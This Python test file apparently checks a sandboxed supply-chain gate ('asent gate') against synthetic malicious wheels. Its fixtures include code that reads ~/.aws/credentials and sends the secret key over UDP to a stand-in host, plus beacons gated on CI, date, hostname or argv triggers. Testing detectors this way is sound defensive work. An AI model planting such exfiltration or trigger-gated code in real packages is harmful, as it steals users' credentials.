"""PRs 12 and 13 of docs/cavr-m2-plan.md, Docker: the M2 demo wheels through `asent gate` on the real sandbox.

Each wheel is a real wheel built in a temporary directory, served by a local package index (`FakeIndex`, the real
bytes with a registry response whose digest is computed from them), committed to a real git repository as the head's
`requirements.txt` (`demo==1.0`) with an application file that calls it, and judged by `asent gate` (the CLI,
in-process) with the CAVR sandbox image: fast gate, escalation, frontier, drive plan, counterfactual loop.

As a test (CAVR_DOCKER=1): one test per wheel, with the verdict, rule, decision and exit code it must give, and
(PR 13) the cause its causal graph names for a REJECTED verdict.
As a script (the commands in docs/cavr-demo.md, "M2 demo: real wheels"):

    CAVR_DOCKER=1 .venv/bin/python tests/test_cavr_m2_wheels.py <wheel> [<wheel> ...]

prints the `asent report` text of that gate run. Nothing here fakes a verdict: the container, the trace and the
judgement are real; only the package index is local (the wheels are not on PyPI).
"""
from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

if __name__ == "__main__":  # run as a script: the same imports as under pytest
    sys.path[:0] = [str(Path(__file__).resolve().parents[1]), str(Path(__file__).resolve().parent)]

import pytest

from backend.cavr import gate_adapter
from backend.commands.report import cavr_deep, render
from gate_support import DISABLED, GateRepo, POLICY, config, invoice_app_files, run_cli
from test_cavr_support import (FakeIndex, PIN_VERSION, RECORDED_6_21_4, build_wheel, cavr_containers, requires_docker,
                               sandbox_identity, write_osv_cache)

TARGET = "('198.51.100.24', 443)"
FIRE = f"    try:\n        socket.create_connection({TARGET}, timeout=1)\n    except OSError:\n        pass\n"
RUN = "\n\ndef run():\n    return 1\n"
SCOPED = {"project_task_description": "Billing dashboard", "allowed_scopes": ["NETWORK_CONNECT:198.51.100.24:443"]}
FILE_SCOPED = {"allowed_scopes": ["FILE_READ:/tmp/home/.cache", "PROCESS_EXEC:none", "NETWORK_CONNECT:none"]}
SEND = {"demo/__init__.py": "from .net import send\n" + RUN,
        "demo/net.py": f"import socket\n\n\ndef send(data):\n{FIRE}"}
EXFIL = ("import os, socket\n\ntry:\n    aws = open(os.path.expanduser('~/.aws/credentials')).read()\n"
         "    secret = aws.split('aws_secret_access_key = ')[1].split()[0]\n"
         "    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(secret.encode(), ('198.51.100.24', 53))\n"
         f"    socket.create_connection({TARGET}, timeout=1)\nexcept OSError:\n    pass\n" + RUN)
BENIGN_FUNCTION = {"demo/__init__.py": "from .net import send\n" + RUN,
                   "demo/net.py": "import socket\n\n\ndef send(data):\n    socket.create_connection(('example.invalid', 443))\n"}


def trigger(head):
    return {"demo/__init__.py": head + FIRE + RUN}


# name -> files, the application's call, the policy change, and (status, rule, decision, exit code)
WHEELS = {
    "env_ci": (trigger("import os, socket\nif os.environ.get('CI') == 'true':\n"), "demo.run()", None,
               ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    "date": (trigger("import datetime, socket\nif datetime.date.today() >= datetime.date(2027, 1, 1):\n"), "demo.run()",
             None, ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    "hostname": (trigger("import socket\nif socket.gethostname() == 'build-prod-7':\n"), "demo.run()", None,
                 ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    "argv": (trigger("import socket, sys\nif '--deploy' in sys.argv:\n"), "demo.run()", None,
             ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    # The condition itself stats ~/.kube/config, a credential path: a SECRET_READ attempt in the canary-only run.
    "file_kube": (trigger("import os, socket\nif os.path.exists(os.path.expanduser('~/.kube/config')):\n"), "demo.run()",
                  None, ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    # The same on a path that is no credential, whose read the policy grants: only the trigger run violates.
    "file_flag": (trigger("import os, socket\nif os.path.exists(os.path.expanduser('~/.cache/deploy.flag')):\n"),
                  "demo.run()", FILE_SCOPED, ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    "canary_exfil": ({"demo/__init__.py": EXFIL}, "demo.run()", None, ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    "driven_reject": (SEND, "demo.send('x')", None, ("REJECTED", "DEEP_CONTRACT_VIOLATION", "BLOCK", 1)),
    "driven_verify": (SEND, "demo.send('x')", SCOPED, ("VERIFIED", "DEEP_RUN_CLEAN", "ACCEPT", 0)),
    "benign_triggered": (trigger("import os, socket\nif os.environ.get('CI') == 'true':\n"), "demo.run()", SCOPED,
                         ("VERIFIED", "DEEP_RUN_CLEAN", "ACCEPT", 0)),
    "win32": (trigger("import socket, sys\nif sys.platform == 'win32':\n"), "demo.run()", None,
              ("UNRESOLVED", "TRIGGER_UNSIMULABLE", "REVIEW", 2)),
    "budget": ({"demo/__init__.py": "import os, socket\n" + "".join(
        f"if os.environ.get('DEPLOY_{i}') == 'yes':\n{FIRE}" for i in range(1, 9)) + RUN}, "demo.run()", SCOPED,
               ("UNRESOLVED", "DEEP_RUN_BUDGET_EXHAUSTED", "REVIEW", 2)),
    "function_sink": (BENIGN_FUNCTION, "demo.run()", None, ("UNRESOLVED", "DEEP_SINK_NOT_EXERCISED", "REVIEW", 2)),
}


# PR 13: the cause the causal graph gives for the event a REJECTED verdict names first (and the report line shows).
CAUSES = {"env_ci": "caused by CI=true", "date": "caused by clock 2027-01-02T12:00:00", "hostname": "caused by hostname build-prod-7",
          "argv": "caused by argv [", "file_kube": "in the canary-only run (no trigger needed)",
          "file_flag": "caused by /tmp/home/.cache/deploy.flag exists",
          "canary_exfil": "in the canary-only run (no trigger needed)",
          "driven_reject": "caused by calling demo.send('x') at app/uses_demo.py:5"}


def gate(name: str, workdir: Path):
    """(exit code, report, the package's CAVR row) of `asent gate` on the wheel `name`."""
    files, call, policy_change, _ = WHEELS[name]
    index = FakeIndex()
    index.add("demo", "1.0", build_wheel(workdir / "wheels", "demo", "1.0", files=files))
    osv = workdir / "osv"
    write_osv_cache(osv, "demo", "1.0", [])
    write_osv_cache(osv, "pypdf", PIN_VERSION, RECORDED_6_21_4)
    policy = {**POLICY, "approved_requirements": ["demo==1.0"], **(policy_change or {})}
    repo = GateRepo(workdir / "repo")
    repo.commit({**invoice_app_files(), "requirements.txt": "", ".asent/cavr/policy.json": json.dumps(policy, indent=2),
                 ".asent/config.json": config(CAVR={"enabled": True}, SATRA=DISABLED, SABLE=DISABLED)}, tag="base")
    repo.commit({"requirements.txt": "demo==1.0\n", "app/uses_demo.py": f"import demo\n\n\ndef go():\n    return {call}\n"},
                tag="head")
    saved = gate_adapter.SETTINGS
    gate_adapter.SETTINGS = {**saved, "transport": index, "osv": None, "advisory_cache_dir": osv, "live_advisories": False,
                             "repair": False, "deep": "sandbox"}
    try:
        code, report, _ = run_cli(repo, "base", "head", workdir / "out", "--data-dir", str(workdir / "data"))
    finally:
        gate_adapter.SETTINGS = saved
    record = next(e for e in report["assurance"]["evidence"] if e["evidence_id"] == report["modules"]["CAVR"]["evidence_id"])
    (row,) = [p for entry in record["details"]["pipeline"] for p in entry["packages"]]
    return code, report, row


@requires_docker
@pytest.mark.parametrize("name", list(WHEELS))
def test_m2_demo_wheel_through_asent_gate(name, tmp_path):
    sandbox_identity()
    status, rule, decision, exit_code = WHEELS[name][3]
    code, report, row = gate(name, tmp_path)
    deep = row["deep"]
    assert deep is not None, row["reason"]
    assert (row["status"], deep["rule"], report["decision"], code) == (status, rule, decision, exit_code), deep["reason"]
    (line,) = cavr_deep(report)
    assert f"demo==1.0 {status} {rule}" in line
    runs = deep["runs"]
    assert runs and runs[0]["kind"] == "canary-only" and all(r["home_removed"] for r in runs)
    if name == "budget":
        assert len(runs) == 8 and deep["loop"]["stop"] == "runs"
        (left,) = deep["residual"]["entries"]
        assert "DEPLOY_8" in left["predicate"] and "8 sandbox runs" in left["outcome"]
    if name == "win32":
        assert len(runs) == 1 and "win32" in deep["residual"]["entries"][0]["predicate"]
    if name in ("file_kube", "canary_exfil"):
        assert deep["decisive_run"] == 1  # no trigger needed: the canary-only run already violates
    if name in ("env_ci", "date", "hostname", "argv", "file_flag"):
        assert deep["decisive_run"] == 2 and runs[1]["kind"] == "counterfactual"
    if name == "canary_exfil":
        assert any(k["rule"] == "CONTRACT_VIOLATION" for k in deep["key_events"])
    if name.startswith("driven_"):
        assert [d["call"] for d in deep["drives"]["driven"]] == ["demo.send('x')"]
    if name == "driven_reject":
        assert deep["key_events"][0]["step"] == "drive_1"
    if name == "function_sink":
        assert "demo.run() at app/uses_demo.py:5 showed no NETWORK_CONNECT event" in deep["reason"]
    graph, causal = deep["causal_graph"], deep["causal"]
    assert causal["digest"] == graph["digest"] and len(graph["digest"]) == 64 and not causal["error"]
    if name in CAUSES:
        assert causal["cause"].startswith(CAUSES[name]), causal["cause"]
        assert causal["cause"] in line and causal["cause"] in deep["reason"]
        if name == "argv":
            assert "--deploy" in causal["cause"]
        assert any(e["kind"] == "decides" for e in graph["edges"])
    else:
        assert causal["cause"] is None and not any(e["kind"] == "decides" for e in graph["edges"])
    assert cavr_containers() == []


def main(names):
    for name in names or list(WHEELS):
        with tempfile.TemporaryDirectory(prefix="cavr-m2-demo-") as directory:
            code, report, _ = gate(name, Path(directory))
            print(f"### {name}: asent gate exit {code}")
            print(render(report, Path("asent-report.json")))


if __name__ == "__main__":
    main(sys.argv[1:])
